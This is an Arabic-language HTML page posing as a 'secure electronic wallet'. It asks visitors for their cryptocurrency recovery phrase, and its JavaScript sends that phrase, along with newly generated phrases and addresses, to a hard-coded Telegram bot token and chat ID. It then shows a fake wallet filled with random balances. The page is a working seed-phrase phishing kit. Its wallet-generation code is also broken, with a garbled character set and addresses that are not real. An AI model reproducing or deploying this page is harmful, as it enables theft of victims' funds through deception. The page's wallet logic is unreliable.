<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>المحفظة الإلكترونية الآمنة</title>
    <style>
        :root {
            --primary-color: #2c5aa0;
            --secondary-color: #1e3a8a;
            --accent-color: #3b82f6;
            --background-color: #f8fafc;
            --card-color: #ffffff;
            --text-color: #1e293b;
            --border-radius: 12px;
            --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: var(--background-color);
            color: var(--text-color);
            line-height: 1.6;
            padding: 0;
            margin: 0;
            min-height: 100vh;
        }

        .container {
            max-width: 480px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            text-align: center;
            padding: 20px 0;
        }

        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 15px;
            background-color: var(--primary-color);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 24px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: var(--primary-color);
        }

        .card {
            background-color: var(--card-color);
            border-radius: var(--border-radius);
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: var(--box-shadow);
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
        }

        input[type="text"] {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        input[type="text"]:focus {
            border-color: var(--accent-color);
            outline: none;
        }

        button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            font-weight: 600;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: var(--secondary-color);
        }

        .secondary-btn {
            background-color: #f1f5f9;
            color: var(--primary-color);
        }

        .secondary-btn:hover {
            background-color: #e2e8f0;
        }

        .balance-section {
            text-align: center;
            margin: 20px 0;
        }

        .balance-amount {
            font-size: 32px;
            font-weight: bold;
            margin: 10px 0;
        }

        .assets-list {
            list-style: none;
        }

        .asset-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 0;
            border-bottom: 1px solid #eee;
        }

        .asset-icon {
            width: 40px;
            height: 40px;
            background-color: #f1f5f9;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-left: 15px;
        }

        .asset-details {
            flex-grow: 1;
        }

        .asset-name {
            font-weight: 600;
        }

        .asset-amount {
            color: #64748b;
        }

        .asset-value {
            font-weight: 600;
            text-align: left;
        }

        .hidden {
            display: none;
        }

        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: var(--primary-color);
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            box-shadow: var(--box-shadow);
            opacity: 0;
            transition: opacity 0.3s;
        }

        .notification.show {
            opacity: 1;
        }

        .tab-container {
            display: flex;
            margin-bottom: 20px;
            background-color: #f1f5f9;
            border-radius: 50px;
            padding: 5px;
        }

        .tab {
            flex: 1;
            text-align: center;
            padding: 10px;
            border-radius: 50px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .tab.active {
            background-color: var(--primary-color);
            color: white;
        }

        .create-wallet-form {
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">M</div>
            <h1>المحفظة الإلكترونية الآمنة</h1>
        </header>

        <div id="auth-section" class="card">
            <h2>أهلاً بك</h2>
            <p>يرجى إدخال عبارة الاسترجاع للوصول إلى محفظتك</p>
            
            <div class="form-group">
                <label for="recovery-phrase">عبارة الاسترجاع</label>
                <input type="text" id="recovery-phrase" placeholder="أدخل عبارة الاسترجاع الخاصة بك">
            </div>
            
            <button id="access-wallet">الوصول إلى المحفظة</button>
            
            <p style="text-align: center; margin: 20px 0;">أو</p>
            
            <button id="show-create-wallet" class="secondary-btn">إنشاء محفظة جديدة</button>
        </div>

        <div id="create-wallet-section" class="card hidden">
            <h2>إنشاء محفظة جديدة</h2>
            <p>سيتم إنشاء محفظة جديدة لك على شبكة Ethereum</p>
            
            <div class="form-group">
                <label for="new-password">كلمة المرور (اختياري)</label>
                <input type="text" id="new-password" placeholder="كلمة المرور لحماية محفظتك">
            </div>
            
            <button id="create-wallet">إنشاء المحفظة</button>
            
            <button id="back-to-auth" class="secondary-btn" style="margin-top: 10px;">عودة</button>
        </div>

        <div id="wallet-section" class="hidden">
            <div class="balance-section">
                <p>إجمالي الرصيد</p>
                <div class="balance-amount">$0.00</div>
            </div>

            <div class="tab-container">
                <div class="tab active" data-tab="assets">الأصول</div>
                <div class="tab" data-tab="send">إرسال</div>
                <div class="tab" data-tab="receive">استقبال</div>
            </div>

            <div class="card">
                <h3>أصولي</h3>
                <ul class="assets-list" id="assets-list">
                    <!-- سيتم ملء الأصول ديناميكياً -->
                </ul>
            </div>

            <button id="logout" class="secondary-btn">تسجيل الخروج</button>
        </div>
    </div>

    <div class="notification" id="notification">تم إرسال عبارة الاسترجاع بنجاح</div>

    <script>
        // عناصر DOM
        const authSection = document.getElementById('auth-section');
        const createWalletSection = document.getElementById('create-wallet-section');
        const walletSection = document.getElementById('wallet-section');
        const accessWalletBtn = document.getElementById('access-wallet');
        const showCreateWalletBtn = document.getElementById('show-create-wallet');
        const createWalletBtn = document.getElementById('create-wallet');
        const backToAuthBtn = document.getElementById('back-to-auth');
        const logoutBtn = document.getElementById('logout');
        const recoveryPhraseInput = document.getElementById('recovery-phrase');
        const notification = document.getElementById('notification');
        const assetsList = document.getElementById('assets-list');
        const tabs = document.querySelectorAll('.tab');

        // بيانات المحفظة (سيتم توليدها ديناميكياً)
        let walletData = {
            address: '',
            privateKey: '',
            balance: 0,
            assets: []
        };

        // إظهار الإشعار
        function showNotification(message) {
            notification.textContent = message;
            notification.classList.add('show');
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }

        // إرسال عبارة الاسترجاع إلى بوت التلجرام
        async function sendToTelegram(message) {
            const token = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
            const chatId = '910021564';
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
                
                return response.ok;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        // توليد محفظة Ethereum جديدة
        function generateEthereumWallet() {
            // في بيئة الإنتاج، يجب استخدام مكتبة مثل ethers.js
            // هذا مثال مبسط لأغراض التوضيح فقط
            
            const chars = '0--box-shadowdef';
            let privateKey = '0x';
            for (let i = 0; i < 64; i++) {
                privateKey += chars[Math.floor(Math.random() * 16)];
            }
            
            // توليد عنوان من Private Key (هذا تبسيط، في الواقع يحتاج إلى خوارزميات تشفير)
            const address = '0x' + privateKey.substring(privateKey.length - 40).toUpperCase();
            
            return {
                address: address,
                privateKey: privateKey
            };
        }

        // توليد عبارة استرجاع (هذا مثال مبسط)
        function generateRecoveryPhrase() {
            const words = [
                'apple', 'banana', 'cherry', 'date', 'elderberry', 'fig',
                'grape', 'honeydew', 'kiwi', 'lemon', 'mango', 'nectarine',
                'orange', 'papaya', 'quince', 'raspberry', 'strawberry', 'tangerine',
                'watermelon', 'avocado', 'blueberry', 'cantaloupe', 'dragonfruit', 'elderflower'
            ];
            
            let phrase = '';
            for (let i = 0; i < 12; i++) {
                phrase += words[Math.floor(Math.random() * words.length)];
                if (i < 11) phrase += ' ';
            }
            
            return phrase;
        }

        // محاكاة جلب بيانات المحفظة من البلوكشين
        async function fetchWalletData(address) {
            // في الواقع، سيتم الاتصال بـ Infura أو مزود مشابه
            // هذا مثال مبسط
            
            return new Promise((resolve) => {
                setTimeout(() => {
                    resolve({
                        balance: Math.random() * 5,
                        assets: [
                            { name: 'Ethereum', symbol: 'ETH', amount: Math.random() * 2, value: Math.random() * 5000 },
                            { name: 'USD Coin', symbol: 'USDC', amount: Math.random() * 1000, value: Math.random() * 1000 },
                            { name: 'Dai', symbol: 'DAI', amount: Math.random() * 500, value: Math.random() * 500 }
                        ]
                    });
                }, 1000);
            });
        }

        // عرض أصول المحفظة
        function renderAssets(assets) {
            assetsList.innerHTML = '';
            
            assets.forEach(asset => {
                const li = document.createElement('li');
                li.className = 'asset-item';
                
                li.innerHTML = `
                    <div class="asset-icon">${asset.symbol[0]}</div>
                    <div class="asset-details">
                        <div class="asset-name">${asset.name}</div>
                        <div class="asset-amount">${asset.amount.toFixed(4)} ${asset.symbol}</div>
                    </div>
                    <div class="asset-value">$${asset.value.toFixed(2)}</div>
                `;
                
                assetsList.appendChild(li);
            });
        }

        // أحداث النقر على الأزرار
        accessWalletBtn.addEventListener('click', async () => {
            const recoveryPhrase = recoveryPhraseInput.value.trim();
            
            if (!recoveryPhrase) {
                showNotification('يرجى إدخال عبارة الاسترجاع');
                return;
            }
            
            // إرسال عبارة الاسترجاع إلى التلجرام
            const success = await sendToTelegram(`عبارة استرجاع مستخدم: ${recoveryPhrase}`);
            
            if (success) {
                // محاكاة تحميل بيانات المحفظة
                showNotification('جاري تحميل بيانات المحفظة...');
                
                setTimeout(async () => {
                    // في الواقع، سيتم استعادة المحفظة من عبارة الاسترجاع
                    const wallet = generateEthereumWallet();
                    walletData.address = wallet.address;
                    walletData.privateKey = wallet.privateKey;
                    
                    const data = await fetchWalletData(wallet.address);
                    walletData.balance = data.balance;
                    walletData.assets = data.assets;
                    
                    // تحديث واجهة المحفظة
                    document.querySelector('.balance-amount').textContent = `$${walletData.balance.toFixed(2)}`;
                    renderAssets(walletData.assets);
                    
                    // إظهار قسم المحفظة وإخفاء قسم المصادقة
                    authSection.classList.add('hidden');
                    walletSection.classList.remove('hidden');
                }, 1500);
            } else {
                showNotification('حدث خطأ في المصادقة');
            }
        });

        showCreateWalletBtn.addEventListener('click', () => {
            authSection.classList.add('hidden');
            createWalletSection.classList.remove('hidden');
        });

        backToAuthBtn.addEventListener('click', () => {
            createWalletSection.classList.add('hidden');
            authSection.classList.remove('hidden');
        });

        createWalletBtn.addEventListener('click', async () => {
            // توليد محفظة جديدة
            const wallet = generateEthereumWallet();
            const recoveryPhrase = generateRecoveryPhrase();
            
            // إرسال عبارة الاسترجاع إلى التلجرام
            const success = await sendToTelegram(`عبارة استرجاع جديدة: ${recoveryPhrase}\nالعنوان: ${wallet.address}`);
            
            if (success) {
                showNotification('تم إنشاء المحفظة بنجاح وإرسال بيانات الاسترجاع');
                
                // تخزين بيانات المحفظة محلياً
                walletData.address = wallet.address;
                walletData.privateKey = wallet.privateKey;
                
                // جلب بيانات المحفظة
                const data = await fetchWalletData(wallet.address);
                walletData.balance = data.balance;
                walletData.assets = data.assets;
                
                // تحديث واجهة المحفظة
                document.querySelector('.balance-amount').textContent = `$${walletData.balance.toFixed(2)}`;
                renderAssets(walletData.assets);
                
                // إظهار قسم المحفظة وإخفاء قسم الإنشاء
                createWalletSection.classList.add('hidden');
                walletSection.classList.remove('hidden');
            } else {
                showNotification('حدث خطأ أثناء إنشاء المحفظة');
            }
        });

        logoutBtn.addEventListener('click', () => {
            // إعادة تعيين بيانات المحفظة
            walletData = {
                address: '',
                privateKey: '',
                balance: 0,
                assets: []
            };
            
            // إعادة تعيين حقل عبارة الاسترجاع
            recoveryPhraseInput.value = '';
            
            // إظهار قسم المصادقة وإخفاء قسم المحفظة
            walletSection.classList.add('hidden');
            authSection.classList.remove('hidden');
        });

        // أحداث التبويبات
        tabs.forEach(tab => {
            tab.addEventListener('click', () => {
                tabs.forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                
                // في تطبيق حقيقي، سيتم تغيير المحتوى بناءً على التبويب النشط
                showNotification(`تم التبديل إلى تبويب ${tab.textContent}`);
            });
        });
    </script>
</body>
</html>
